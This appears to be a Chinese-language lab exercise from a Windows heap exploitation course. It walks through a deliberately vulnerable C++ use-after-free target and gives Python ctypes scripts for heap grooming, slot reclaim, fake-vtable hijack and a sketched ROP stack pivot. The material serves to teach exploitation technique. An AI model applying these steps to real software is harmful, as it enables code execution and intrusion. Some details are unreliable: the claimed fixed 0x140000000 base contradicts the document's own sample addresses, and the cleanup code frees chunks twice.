# 練習 D — heap UAF → 控 vtable → 轉 ROP

> 目標：把 Ch 27–31 的知識串起來——自己操作一個含 UAF 漏洞的 C++ 靶，走完「free → 讀 dangling vptr（info leak）→ reclaim → 偽造 vtable → 虛擬呼叫劫持」的完整鏈，感受每個步驟的 timing 和精度要求。

## 背景

你在 Part 4 學了：

- Ch 27：UAF 的成因和利用步驟（free → reclaim → dangling use）
- Ch 28：LFH grooming（讓 reclaim 有確定性）
- Ch 29：Segment Heap 的利用面（VS 紅黑樹節點、LFH subsegment 偽造）
- Ch 30：vtable 劫持（vptr 在 offset 0、vtable 在 .rdata、三條機器碼）
- Ch 31：info leak（洩漏 vptr → 算 module 基址 → 算 gadget 位址）

這個練習把它們拼成一條完整的利用鏈，在一個**刻意設計的 C++ 靶**上走完。靶程式是用 mingw 編的 win32 EXE（NT Heap + LFH），不是 Segment Heap 靶——這讓你能在本機直接測試，不需要 WinDbg 或系統行程注入。

**本練習的核心技法是在真實 heap 上執行的**，但某些步驟（確認 reclaim 成功、fake vtable 的精確 ROP 跳轉）在沒有 debugger 的情況下難以驗證，這些步驟標「理論流程，需 debugger 確認」。

## 靶程式規格

靶程式 `target_uaf.cpp`（用 mingw g++ 編譯，本機實測通過）：

```cpp
// target_uaf.cpp  — 練習 D 的靶程式（含刻意設計的 UAF 漏洞）
// 編譯：g++ -O0 -fno-stack-protector target_uaf.cpp -o target_uaf.exe

#include <cstdio>
#include <cstdlib>
#include <cstring>

// ── 虛擬函式類別 ──────────────────────────────────────────────────────────────
class Widget {
public:
    int id;
    char name[24];   // vptr(8) + id(4) + pad(4) + name(24) = 40 bytes

    Widget(int id_, const char* n) : id(id_) {
        strncpy(name, n, sizeof(name)-1);
        name[sizeof(name)-1] = '\0';
    }
    virtual void draw()   { printf("[Widget %d] draw: %s\n", id, name); }
    virtual void update() { printf("[Widget %d] update\n", id); }
    virtual ~Widget()     { printf("[Widget %d] destroyed\n", id); }
};

class Button : public Widget {
public:
    Button(int id_, const char* n) : Widget(id_, n) {}
    virtual void draw()  override { printf("[Button %d] DRAW: %s\n", id, name); }
    virtual void click()          { printf("[Button %d] click!\n", id); }
};

// ── 物件管理器（含 UAF 漏洞）─────────────────────────────────────────────────
#define MAX_WIDGETS 16
static Widget* g_widgets[MAX_WIDGETS];  // 全域快取，free 後不清 NULL = UAF 根因

void cmd_alloc(int idx, int type, const char* name) {
    if (idx < 0 || idx >= MAX_WIDGETS) { puts("bad idx"); return; }
    if (type == 0)
        g_widgets[idx] = new Widget(idx, name);
    else
        g_widgets[idx] = new Button(idx, name);
    printf("alloc: g_widgets[%d] = %p (size=%zu)\n",
           idx, (void*)g_widgets[idx], sizeof(Widget));
}

void cmd_free(int idx) {
    if (idx < 0 || idx >= MAX_WIDGETS) { puts("bad idx"); return; }
    if (!g_widgets[idx]) { puts("already null"); return; }
    delete g_widgets[idx];
    // !! 刻意不清 g_widgets[idx] = nullptr  → UAF 漏洞 !!
    printf("free: g_widgets[%d] freed (dangling pointer remains)\n", idx);
}

void cmd_use(int idx) {
    if (idx < 0 || idx >= MAX_WIDGETS || !g_widgets[idx]) {
        puts("null ptr"); return;
    }
    g_widgets[idx]->draw();    // !! UAF：可能是 dangling pointer
}

// ── 佔位物件（Sprite）——和 Widget 大小相同（40 bytes）────────────────────────
struct Sprite {
    void*  fake_vptr;  // +0x00：攻擊者設定的假 vptr
    int    id;         // +0x08
    char   pad[28];    // +0x0c：填滿到 40 bytes
};
static_assert(sizeof(Sprite) == 40, "Sprite must match Widget size");

// ── 工具函式 ──────────────────────────────────────────────────────────────────
void* read_vptr(void* obj) { return *(void**)obj; }

static void* fake_vtable[4];  // 讀者填入 exploit payload

int main(int argc, char** argv) {
    // 列印佈局資訊
    Widget w(99, "ref");
    void* real_vptr  = read_vptr(&w);
    void** real_vtbl = (void**)real_vptr;
    printf("=== 佈局資訊 ===\n");
    printf("Widget obj addr : %p\n", (void*)&w);
    printf("Widget vptr     : %p\n", real_vptr);
    printf("  vtable[0] draw  : %p\n", real_vtbl[0]);
    printf("  vtable[1] update: %p\n", real_vtbl[1]);
    printf("  vtable[2] dtor  : %p\n", real_vtbl[2]);
    printf("sizeof(Widget)  : %zu\n", sizeof(Widget));
    printf("fake_vtable[]:   %p\n\n", (void*)fake_vtable);

    char line[256];
    while (fgets(line, sizeof(line), stdin)) {
        char cmd[16], name[32];
        int idx, type;
        if      (sscanf(line, "alloc %d %d %31s", &idx, &type, name) == 3) cmd_alloc(idx, type, name);
        else if (sscanf(line, "free %d",  &idx) == 1) cmd_free(idx);
        else if (sscanf(line, "use %d",   &idx) == 1) cmd_use(idx);
        else if (sscanf(line, "vptr %d",  &idx) == 1) {
            if (idx >= 0 && idx < MAX_WIDGETS && g_widgets[idx])
                printf("vptr[%d] = %p\n", idx, read_vptr(g_widgets[idx]));
            else puts("null or bad idx");
        }
        else if (strncmp(line, "quit", 4) == 0) break;
        else printf("? %s", line);
    }
    return 0;
}
```

編譯指令（mingw，本機實測通過）：

```
g++ -O0 -fno-stack-protector target_uaf.cpp -o target_uaf.exe
```

實測輸出（基礎功能驗證）：

```
$ echo -e "alloc 0 0 hello\nalloc 1 1 world\nuse 0\nuse 1\nfree 0\nuse 0\nquit" | ./target_uaf.exe

=== 佈局資訊 ===
Widget obj addr : 000000222c7ff8c0
Widget vptr     : 00007ff6bf8d4090
  vtable[0] draw  : 00007ff6bf8d0f10
  vtable[1] update: 00007ff6bf8d0f50
  vtable[2] dtor  : 00007ff6bf8d1070
sizeof(Widget)  : 40
fake_vtable[]:   00007ff6bf8e4160

alloc: g_widgets[0] = 0000017a2db41300 (size=40)
alloc: g_widgets[1] = 0000017a2db41150 (size=40)
[Widget 0] draw: hello
[Button 1] DRAW: world
[Widget 0] destroyed
free: g_widgets[0] freed (dangling pointer remains)
[Widget 0] draw: hello          ← UAF：free 後 dangling draw，vptr 殘留
[Widget 99] destroyed
```

**UAF 確認**：`free 0` 後 `use 0` 仍然觸發了 `draw`（dangling pointer 讀到殘留的 vptr，成功呼叫虛擬函式）。

## 驗收標準

完成這個練習後，你應該能夠：

1. **Phase 1（info leak）**：在 victim free 後，用 dangling pointer 讀出 vptr 的值，算出 module 基址
2. **Phase 2（grooming）**：分配足夠多的同 bucket 物件，讓 victim 所在的 LFH subsegment 只剩 victim 的 slot 是 free 的
3. **Phase 3（reclaim）**：分配 Sprite 物件（size=40），確認它佔回了 victim 的 slot（透過再次讀 dangling pointer 的 vptr 判斷）
4. **Phase 4（vtable 劫持）**：在 Sprite 的 `+0x00` 填入 fake_vtable 的位址，觸發 `use 0`，控制流跳到 fake_vtable[0]
5. **Phase 5（轉 ROP）**：fake_vtable[0] 指向一個跳板函式（本練習用 `printf` 當示範目標，在真實 exploit 裡換成 ROP gadget）

## 實作步驟

### Step 1：了解目標物件的記憶體佈局

啟動靶程式，看「佈局資訊」輸出：

```
alloc: g_widgets[0] = 0x...（victim 的 heap 位址）
Widget vptr: 0x...（指向 Widget::vtable，在 module 的 .rdata）
vtable[0] draw: 0x...（Widget::draw 的位址）
sizeof(Widget): 40
```

確認你理解：

- `g_widgets[0]` 的前 8 bytes 是 vptr
- vptr 指向的位址是 Widget::vtable（在 target_uaf.exe 的 .rdata 裡）
- victim 物件大小 = 40 bytes → LFH bucket = bucket 8（管 33–40 bytes 的分配）

### Step 2：info leak — 讀殘留 vptr，計算 module 基址

```
步驟 2a：分配 victim
  alloc 0 0 victim_widget

步驟 2b：free victim（製造 dangling pointer）
  free 0

步驟 2c：讀 dangling pointer 的 vptr（UAF read）
  vptr 0
  → 輸出：vptr[0] = 0x7ff6bf8d4090（Widget::vtable 的位址）
  → 這個值的低 16 bits 和 Widget::vtable 的 RVA 一致
```

靜態計算 module 基址（在 Python 裡做，或紙上計算）：

```python
# 從靶程式啟動時的「佈局資訊」取得 Widget::vtable 的位址
# 再從靜態分析（objdump -d 或 dumpbin）找 vtable 的 RVA

# 示意（假設值，要以你實際執行的輸出為準）：
leaked_vptr = 0x7ff6bf8d4090   # 從 vptr 0 指令讀到的值
# 靜態分析：dumpbin /RELOCATIONS target_uaf.exe 找到 vtable 的 offset
# 或：用 objdump -d 看 Widget::draw 的位址，widget_vtable = base + vtable_rva
# 簡化做法：靶程式啟動時印了「Widget vptr: 0x...」，和分配的物件 vptr 是同一個值
# → 兩個值應該相同（info leak = 確認）

# 計算 module_base：
# 靶程式用 -no-pie 或沒有 PIE 的情況下，base 可能是固定的（0x140000000）
# 有 PIE：用靜態分析的 vtable RVA 做減法
vtable_rva = 0x34090   # objdump 得到（你的環境可能不同，要自行確認）
module_base = leaked_vptr - vtable_rva
print(f"module_base: 0x{module_base:016X}")
# 預期：對齊 0x10000，mingw 二進位的 ImageBase 通常是 0x140000000（PE 預設）
```

> 注意：mingw 預設不開 PIE（`-no-pie` 是預設），靶程式的 ImageBase 通常是固定的 `0x140000000`。這意味著 vptr 洩漏的 module base 每次執行可能相同——但在真實利用場景（有 ASLR 的靶），這個計算是必要的。

### Step 3：grooming — 讓 victim 的 slot 是唯一的 free slot

LFH 的 allocation randomization（Ch 15 / Ch 28）讓 reclaim 是機率性的。壓制法（把 UserBlocks 的其他 free slot 填滿）讓 reclaim 確定性達到接近 100%：

```
步驟 3a：在 victim free 之前，先大量分配同 bucket（size=40）物件
  alloc 1 0 pad1
  alloc 2 0 pad2
  alloc 3 0 pad3
  ...（分配到 LFH 啟用為止，通常需要 ~18 次分配）
  alloc 15 0 pad15

步驟 3b：策略性 free 部分填充物件（製造「洞」）
  free 1
  free 3
  free 5

步驟 3c：立刻用 Sprite 把這些「洞」填回（佔滿非 victim 的 free slot）
  （這步在靶程式的指令集裡沒有直接對應，需要在 exploit 程式裡做）
  → 用 Python ctypes 分配同大小的 ctypes buffer

步驟 3d：此時 victim 的 UserBlocks 裡只有一個 free slot（victim 本身）
  free 0  ← victim 現在被 free，也是唯一的 free slot

步驟 3e：分配 Sprite → 確定性佔回 victim 的 slot
  （同樣在 Python exploit 裡做）
```

**簡化做法**（適合本機測試，grooming 不完整但仍然有高機率成功）：

```
alloc 0 0 victim
free 0               ← victim freed，dangling pointer 留著
alloc 1 0 sprite_   ← 大小相同，希望拿回 slot 0
vptr 0               ← 如果 sprite 佔回了 slot 0，vptr[0] 應該改變
```

> **注意**：在沒有確定性 grooming 的情況下，alloc 1 不保證拿回 slot 0。你可能需要多次嘗試，或補充步驟 3a–3c 的完整 grooming。

### Step 4：reclaim — 填入 fake vptr

reclaim 的本質是「分配一個和 victim 大小相同、offset 0 可控的物件，讓它佔回 victim 的 slot，把 offset 0 填成 fake_vtable 的位址」。

在靶程式的框架裡，Sprite 的 `fake_vptr` 欄位正是 offset 0。但靶程式的 `cmd_alloc` 用的是 `new Widget/Button`，不是 Sprite。要做真正的 reclaim 需要在外部的 exploit 腳本裡分配：

**Python exploit 的 reclaim（本機可執行的框架）**：

```python
import ctypes
import subprocess
import struct

k = ctypes.windll.kernel32

# 假設靶程式已在執行中（或者改成注入到靶程式的 heap）
# 這裡示範「用 ctypes 在同一個 process 的 heap 裡模擬 reclaim」

h = k.GetProcessHeap()
k.HeapAlloc.restype = ctypes.c_void_p
k.HeapFree.restype = ctypes.c_bool

# 模擬 victim 分配（size=40，和 Widget 相同）
victim = k.HeapAlloc(h, 0, 40)
print(f"victim slot: 0x{victim:016X}")

# 在 victim 的 offset 0 放一個「vptr 標記」
ctypes.c_uint64.from_address(victim).value = 0xDEADBEEFDEADBEEF
k.HeapFree(h, 0, victim)
print("victim freed (dangling)")

# 嘗試 reclaim：分配同大小的 sprite
sprite = k.HeapAlloc(h, 0, 40)
content = ctypes.c_uint64.from_address(sprite).value
print(f"sprite slot: 0x{sprite:016X}")
print(f"sprite[0]:   0x{content:016X}")

if content == 0xDEADBEEFDEADBEEF:
    print("[SUCCESS] sprite reclaimed victim's slot!")
else:
    print("[MISS] different slot, grooming needed")

# 構造 fake vtable（理論 Phase 4）：
# fake_vtable[0] 指向一個「合法」的跳轉目標（示範：printf 的位址）
fake_vt = (ctypes.c_uint64 * 4)()
msvcrt = ctypes.windll.msvcrt
printf_addr = ctypes.cast(msvcrt.printf, ctypes.c_void_p).value
fake_vt[0] = printf_addr  # 把 draw() 的 slot 指向 printf（示範用）
fake_vt[1] = 0x4141414141414141  # update slot（不關心）
fake_vt[2] = 0x4242424242424242  # dtor slot（不關心）

# 如果 reclaim 成功，把 sprite 的 offset 0 填成 fake_vtable 地址
fake_vt_addr = ctypes.addressof(fake_vt)
ctypes.c_uint64.from_address(sprite).value = fake_vt_addr
print(f"fake_vtable @ 0x{fake_vt_addr:016X}")
print(f"fake_vtable[0] = 0x{fake_vt[0]:016X} (printf)")
print("Phase 4 payload ready; trigger 'use 0' in target to complete hijack")

k.HeapFree(h, 0, sprite)
```

### Step 5：觸發 Use — 虛擬呼叫劫持

在靶程式的命令列介面送 `use 0`：

```
use 0
```

預期行為（如果 reclaim 成功且 fake_vtable 設置正確）：

```
> **理論流程，需要 debugger 確認**

正常路徑：
  g_widgets[0]->draw()
  → mov rax, [g_widgets[0]]    = fake_vtable 的位址（sprite 填的）
  → mov rdx, [rax + 0]         = fake_vtable[0] = 你填的跳轉目標
  → call rdx                    → 跳到你的目標函式

如果目標是 printf（示範）：
  → call printf（但 this=g_widgets[0]，第一個參數是 dangling Widget 指標）
  → printf 可能印出垃圾或 crash（因為 rcx 指向的不是合法的 format string）
  → 觀察到 crash 本身就是「控制流已被改變」的證明
```

> **未實測，理論預期**：跳到 `printf` 的具體行為在沒有 debugger 的情況下難以確認——Windows x64 calling convention 的 `this` 指標在 rcx，不是 rdi（Linux x64）。在真實 exploit 中，fake_vtable[0] 應指向 ROP gadget（例如 `pop rsp; ret` 之類的 trampoline），讓 rsp 指向 attacker 控制的 ROP chain。

### Step 6：轉 ROP（延伸，理論描述）

vtable 劫持的 `call rdx` 讓控制流跳到 fake_vtable[0]。在真實的 Windows 利用中，這個位址通常是一個 ROP gadget，因為：

1. **NX（DEP）**：heap 上的 shellcode 不能直接執行，需要 ROP
2. **CFG（Control Flow Guard）**：如果靶開了 CFG，`call rdx` 前有 CFG check，fake_vtable[0] 必須是 CFG-valid 的位址（在 module 的函式白名單裡）

ROP chain 的入口 gadget（常見模式）：

```
> **未實測，理論預期**

fake_vtable[0] → 指向 "pop rsp; ret" gadget（在 ntdll.dll 或 target_uaf.exe 裡）
                 → "pop rsp" 把 rsp 換成 attacker 控制的值（stack pivot）
                 → "ret" 從新 rsp 的位址取下一條 ROP gadget
                 → 接下來執行 attacker 的 ROP chain

ROP chain 的計算需要：
- ntdll.dll 的基址（從 info leak 算出）
- 靜態分析找到 "pop rsp; ret" 的 RVA（例如 ROPgadget 工具）
- stack pivot 的目標位址（attacker 在 heap 或 stack 上佈置的 ROP payload）
```

在本練習環境（靶程式用 mingw -no-PIE 編，沒有 CFG），可以用更簡單的 gadget：

```
fake_vtable[0] = addr_of( "ret" )  ← 最簡單的 gadget，讓程式繼續執行不 crash
```

## 卡住了？四條提示

**提示 1**：reclaim 一直失敗（sprite 沒有佔回 victim 的 slot）。

先確認兩件事：① Widget 的 sizeof 和 Sprite 的 sizeof 是否真的相同（`static_assert` 已確認 40 bytes）；② LFH 是否已啟用（需要對同 bucket 分配約 18 次之後 LFH 才啟用）。如果 LFH 未啟用，NT Heap 的一般路徑的 reclaim 行為不同——先大量 alloc/free 40-bytes 的 chunk，再做 victim free + sprite alloc。

**提示 2**：fake_vtable 的位址怎麼給 sprite 的 `fake_vptr` 欄位？

在 Python ctypes 的框架裡：

```python
# sprite 是 ctypes 分配的 40-bytes chunk
# fake_vt 是 ctypes 的陣列（存在某個記憶體位址）
fake_vt_addr = ctypes.addressof(fake_vt)
# 把 sprite 的第一個 8 bytes 改成 fake_vt_addr
ctypes.c_uint64.from_address(sprite_addr).value = fake_vt_addr
```

但注意：`fake_vt` 是 Python 的 local variable，Python GC 可能在你使用它之前把它回收。要保持它存活，把 `fake_vt` 放在 module 級別的全域變數或 `global` 聲明裡。

**提示 3**：`call rdx` 跳到 fake_vtable[0] 後立刻 crash，不知道原因。

可能原因：① fake_vtable[0] 的值不是合法的可執行地址；② 跳到了合法地址但那個函式的 calling convention 和你的設置不匹配（例如它期望 rcx 是一個特定格式的字串，但你給了 Widget 指標）；③ CFG 攔截了這次 call（開了 `/guard:cf` 的 binary）。用 debugger 在 `call rdx` 上下斷點，看 rdx 的值是否是你期望的。

**提示 4**：grooming 後 Widget 的 LFH bucket 有哪些 free slot，怎麼確認？

> **需要 WinDbg**：`!heap -flt s 40`（找大小為 40 的 free chunk）可以列出所有 free chunk。在沒有 WinDbg 的環境，用「分配大量 chunk，然後 free victim，然後統計多次 sprite alloc 的成功率」來感受 grooming 的效果。Ch 28 的練習 C 是 grooming 的專項訓練，如果這一步卡住，先回去做那個練習。

## 完整參考解答

**先自己做，做完或卡死再看**。

<details>
<summary>點開參考解答（含靶程式碼和 exploit 腳本）</summary>

### 靶程式（同規格，已在本機確認編譯通過）

見上方「靶程式規格」的完整程式碼，編譯指令：

```
g++ -O0 -fno-stack-protector target_uaf.cpp -o target_uaf.exe
```

### Phase 1–2：info leak（靶程式命令列）

```
# 在靶程式啟動後，輸入以下命令
alloc 0 0 victim     # 分配 victim

# free victim（製造 dangling pointer）
free 0

# UAF read：讀 dangling vptr（vptr 殘留在 freed slot）
vptr 0
# 輸出：vptr[0] = 0x7ff6bf8d4090
# 這就是 Widget::vtable 的位址（在 target_uaf.exe 的 .rdata 裡）
```

### Phase 3–4：grooming + reclaim（Python 腳本）

以下腳本在**另一個 Python process 裡模擬 reclaim**（因為我們不能直接控制靶程式的 heap）。在真實的利用場景（攻擊目標服務），你的 exploit 和靶程式共用 heap，可以直接 spray。

```python
#!/usr/bin/env python3
# exploit_d.py — 練習 D 的 exploit 框架（本機模擬，部分步驟需 debugger 確認）
import ctypes
import ctypes.util

k = ctypes.windll.kernel32
msvcrt = ctypes.windll.msvcrt
k.GetProcessHeap.restype = ctypes.c_void_p
k.HeapAlloc.restype = ctypes.c_void_p
k.HeapFree.restype  = ctypes.c_bool

VICTIM_SIZE = 40  # sizeof(Widget) = 40 bytes

h = k.GetProcessHeap()

# ── Phase 0：準備 fake vtable ─────────────────────────────────────────────────
# fake_vtable[0] = printf 的位址（示範用，真實利用換成 ROP gadget）
# 保持 fake_vt 存活（不被 GC），放到 module-level list
fake_vt = (ctypes.c_uint64 * 4)()
printf_addr = ctypes.cast(msvcrt.printf, ctypes.c_void_p).value
fake_vt[0] = printf_addr
fake_vt[1] = 0xDEAD0001DEAD0001
fake_vt[2] = 0xDEAD0002DEAD0002
fake_vt[3] = 0xDEAD0003DEAD0003
fake_vt_addr = ctypes.addressof(fake_vt)
print(f"[*] fake_vtable @ 0x{fake_vt_addr:016X}")
print(f"[*] fake_vtable[0] = 0x{fake_vt[0]:016X} (printf)")

# ── Phase 1：grooming — 填滿 UserBlocks 的 free slot ───────────────────────
# 分配大量同 bucket（size 40）的 chunk，觸發 LFH，並填滿 UserBlocks
SPRAY_COUNT = 32
spray_chunks = []
for i in range(SPRAY_COUNT):
    p = k.HeapAlloc(h, 0, VICTIM_SIZE)
    if p:
        spray_chunks.append(p)

# ── Phase 2：分配 victim，記錄位址 ──────────────────────────────────────────
victim = k.HeapAlloc(h, 0, VICTIM_SIZE)
# 模擬 Widget 的 vptr（填一個 marker）
ctypes.c_uint64.from_address(victim).value = 0xDEADBEEFDEADBEEF
print(f"[*] victim @ 0x{victim:016X}")

# ── Phase 3：free victim（製造 dangling pointer），立刻 UAF read vptr ─────
k.HeapFree(h, 0, victim)
leaked_content = ctypes.c_uint64.from_address(victim).value
print(f"[*] UAF read vptr = 0x{leaked_content:016X}")
# 如果 leaked_content = 0xDEADBEEFDEADBEEF，vptr 殘留確認

# ── Phase 4：把 spray_chunks 中的某些 free 掉，只保留 victim 的 slot ──────
# 策略：free 一些 spray chunks → 然後用 sprite 填回
# 目的：讓 victim 是 UserBlocks 裡唯一的 free slot
for i in range(0, len(spray_chunks), 2):
    k.HeapFree(h, 0, spray_chunks[i])

# 用「sprite」填回剛剛 free 的 spray slots（讓它們不再是 free）
refill_sprites = []
for i in range(0, len(spray_chunks), 2):
    s = k.HeapAlloc(h, 0, VICTIM_SIZE)
    if s:
        refill_sprites.append(s)

# ── Phase 5：分配 sprite，希望佔回 victim 的 slot ───────────────────────
sprite = k.HeapAlloc(h, 0, VICTIM_SIZE)
print(f"[*] sprite @ 0x{sprite:016X}")

# 驗證是否 reclaim
check = ctypes.c_uint64.from_address(sprite).value
if check == 0xDEADBEEFDEADBEEF:
    print("[+] reclaim SUCCESS: sprite occupies victim's slot")
else:
    print(f"[-] reclaim MISS: sprite[0] = 0x{check:016X}")
    print("    try more grooming or repeat")

# ── Phase 6：填 fake_vptr 到 sprite 的 offset 0 ──────────────────────────
ctypes.c_uint64.from_address(sprite).value = fake_vt_addr
verify = ctypes.c_uint64.from_address(sprite).value
print(f"[*] sprite.fake_vptr set = 0x{verify:016X}")

# ── Phase 7：「觸發 Use」在本模擬環境的模擬 ──────────────────────────────
# 在真實靶（target_uaf.exe）裡，這步是送命令 "use 0" 到靶程式
# 在這個 Python 模擬裡，我們直接示範「用 dangling pointer 做虛擬呼叫」

# 模擬 dangling pointer 使用：手動解參考 victim 的 vptr → vtable[0] → call
# 注意：直接在 Python ctypes 裡「call」是危險的，這裡只示範 read path
vptr_in_sprite = ctypes.c_uint64.from_address(sprite).value
print(f"[*] virtual call: vptr → 0x{vptr_in_sprite:016X}")
vtable = (ctypes.c_uint64 * 4).from_address(vptr_in_sprite)
print(f"    vtable[0] (draw) = 0x{vtable[0]:016X}")
print(f"    → would call 0x{vtable[0]:016X} (printf addr = 0x{printf_addr:016X})")
if vtable[0] == printf_addr:
    print("[+] vtable hijack payload confirmed: draw() → printf")

print("\n[*] In real target, send 'use 0' now to trigger virtual call hijack")

# 清理
k.HeapFree(h, 0, sprite)
for p in refill_sprites: k.HeapFree(h, 0, p)
for p in spray_chunks:   k.HeapFree(h, 0, p)  # 部分可能已 free，heap 會 AV 或忽略
```

### Phase 5：ROP chain 構造（理論描述）

> **未實測，理論預期**：需要 WinDbg / cdb + ROPgadget 工具。

真實 exploit 的 Phase 5：

```python
# 1. 從 info leak 拿到 target_uaf.exe 的 module_base
#    (從 vptr read 算出：leaked_vptr - vtable_rva = module_base)

# 2. 用 ROPgadget 工具找到 "pop rsp; ret" 的 RVA
#    $ ROPgadget --binary target_uaf.exe | grep "pop rsp"

# 3. 算出 gadget 的實際位址
#    pop_rsp_gadget = module_base + pop_rsp_rva

# 4. 在 heap 上佈置 ROP chain（需要知道 heap 基址）
#    rop_chain_addr = heap_base + known_offset

# 5. 設置 fake_vtable：
#    fake_vt[0] = pop_rsp_gadget    ← stack pivot
#    在 pop_rsp_gadget 的 "pop rsp" 之後，rsp = 偽造 ROP chain 的位址
#    然後 "ret" 從 ROP chain 的第一個 gadget 開始執行

# 6. 觸發 use 0 → draw() → call [fake_vt[0]] → pop rsp → pivot → ROP
```

</details>

## 測試用例

### 測試 1：UAF read（驗證 dangling vptr 殘留）

```
# 靶程式命令
alloc 0 0 test_w
free 0
vptr 0
# 預期：vptr[0] 印出原 Widget::vtable 的位址（和啟動時「佈局資訊」的 Widget vptr 相同）
# 若印出 0 或完全不同的值：heap 有 fill 機制（Page Heap 開啟），見下文踩雷
```

### 測試 2：grooming 基本驗證

```python
# Python：分配 32 個同大小 chunk，觀察位址是否有規律
import ctypes
k = ctypes.windll.kernel32
k.GetProcessHeap.restype = ctypes.c_void_p
k.HeapAlloc.restype = ctypes.c_void_p
h = k.GetProcessHeap()

addrs = [k.HeapAlloc(h, 0, 40) for _ in range(32)]
print("Chunk addresses:")
for i, a in enumerate(addrs):
    print(f"  [{i:2d}] 0x{a:016X}")

# 觀察：LFH 啟用後，位址應該在同一個 UserBlocks 裡（相鄰，步長 = 40 或更大的對齊）
# 如果位址很分散，LFH 還沒啟用（繼續分配更多）
for a in addrs:
    k.HeapFree(h, 0, a)
```

### 測試 3：reclaim 成功率（重複 100 次，感受 LFH 隨機化）

```python
import ctypes
k = ctypes.windll.kernel32
k.GetProcessHeap.restype = ctypes.c_void_p
k.HeapAlloc.restype = ctypes.c_void_p
k.HeapFree.restype = ctypes.c_bool
h = k.GetProcessHeap()

success = 0
TRIALS = 100
MARK = 0xCAFEBABECAFEBABE

for _ in range(TRIALS):
    victim = k.HeapAlloc(h, 0, 40)
    ctypes.c_uint64.from_address(victim).value = MARK
    k.HeapFree(h, 0, victim)
    sprite = k.HeapAlloc(h, 0, 40)
    if ctypes.c_uint64.from_address(sprite).value == MARK:
        success += 1
    k.HeapFree(h, 0, sprite)

print(f"Reclaim success rate: {success}/{TRIALS} = {success/TRIALS*100:.1f}%")
# 沒有 grooming 的 baseline：預期 ~50-80%（視 UserBlocks 的 free slot 數）
# 完整 grooming 後：應接近 100%
```

## 延伸挑戰：LFH randomization 下提高可靠性

完成基本練習後，試試看：

**挑戰 1**：把 reclaim 的成功率從「平均」提升到「接近 100%」。

方法（Ch 28 的壓制法）：

```
1. 分配 100 個 size=40 的物件（填滿 LFH 的 UserBlocks）
2. 讓所有 slot 都是 busy 狀態
3. 有選擇地 free 一些 slot（不包含 victim）
4. 用 sprite 把這些洞填回
5. 現在 victim 是唯一的 free slot
6. free victim → alloc sprite → 確定性 reclaim
```

用測試 3 的腳本量化你的 grooming 效果（和 grooming 前的成功率比較）。

**挑戰 2**：讓 fake_vtable[0] 指向一個真實的 ROP gadget（而不是 printf），讓虛擬呼叫後不 crash。

提示：在 `target_uaf.exe` 裡找一個 `ret` 指令的 RVA：

```bash
objdump -d target_uaf.exe | grep -m1 " ret$"
# 找到 "c3" 指令（ret）的位址
# 計算 RVA = 找到的位址 - 0x140000000（mingw PE 預設 ImageBase）
# fake_vt[0] = 0x140000000 + RVA
```

**挑戰 3（需要 WinDbg）**：在 `call rdx` 指令上設斷點，確認 rdx 的值是你的 fake_vtable[0]，然後單步看跳轉行為。

## 自我檢核

- [ ] 能不看提示，完整解釋「為什麼 free 後 vptr 可能還在 heap slot 裡」（和 LFH 的 BusyBitmap 機制的關係）
- [ ] 能說出 grooming（壓制法）的具體步驟，以及為什麼它能把 reclaim 的成功率從 ~50% 提升到 ~100%
- [ ] 能解釋為什麼 fake_vtable 要放在「可讀可執行」的記憶體裡（如果放在 heap 上但 heap 沒有執行權限呢？）
- [ ] 面試被問「Windows heap UAF 利用的完整步驟」，能說出：info leak → grooming → reclaim → fake vptr → 虛擬呼叫劫持 → ROP，每一步做什麼
- [ ] 能解釋「為什麼 CFG 開啟後，fake_vtable[0] 必須是 CFG-valid 的地址，而不能是任意地址」

→ [Ch 32 — CFG (Control Flow Guard) 原理](./32-cfg.md)
